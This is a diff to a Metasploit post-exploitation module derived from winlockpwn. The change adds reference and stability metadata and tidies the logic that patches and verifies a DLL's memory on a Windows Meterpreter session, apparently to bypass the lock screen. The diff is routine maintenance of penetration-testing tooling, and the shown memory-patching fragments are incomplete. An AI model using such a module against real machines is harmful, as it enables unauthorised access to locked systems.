@@ -25,6 +25,9 @@ class MetasploitModule < Msf::Post
           'L4teral <l4teral[4t]gmail com>', # Meterpreter script
           'Metlstorm' # Based on the winlockpwn tool released by Metlstorm: http://www.storm.net.nz/projects/16
         ],
+        'References' => [
+          ['URL', 'http://www.storm.net.nz/projects/16'],
+        ],
         'Platform' => [ 'win' ],
         'SessionTypes' => [ 'meterpreter' ],
         'Compat' => {
@@ -35,6 +38,11 @@ class MetasploitModule < Msf::Post
               stdapi_sys_process_memory_write
             ]
           }
+        },
+        'Notes' => {
+          'Stability' => [CRASH_OS_DOWN],
+          'SideEffects' => [SCREEN_EFFECTS],
+          'Reliability' => []
         }
       )
     )
@@ -79,6 +87,7 @@ class MetasploitModule < Msf::Post
         print_error('Found signature does not match')
         next
       end
+
       old_code = p.memory.read(dllbase + target[:patchoffset], target[:orig_code].length / 2).unpack('H*')[0]
       if !((old_code == target[:orig_code] && !revert) || (old_code == target[:patch] && revert))
         print_error('Found code does not match')
@@ -90,13 +99,12 @@ class MetasploitModule < Msf::Post
       p.memory.write(dllbase + target[:patchoffset], [new_code].pack('H*'))
 
       written_code = p.memory.read(dllbase + target[:patchoffset], target[:patch].length / 2).unpack('H*')[0]
-      if ((written_code == target[:patch] && !revert) || (written_code == target[:orig_code] && revert))
+      if (written_code == target[:patch] && !revert) || (written_code == target[:orig_code] && revert)
         print_status('Done!')
         raise Rex::Script::Completed
-      else
-        print_error('Failed!')
-        next
       end
+
+      print_error('Failed!')
     end
 
     print_error('No working target found')
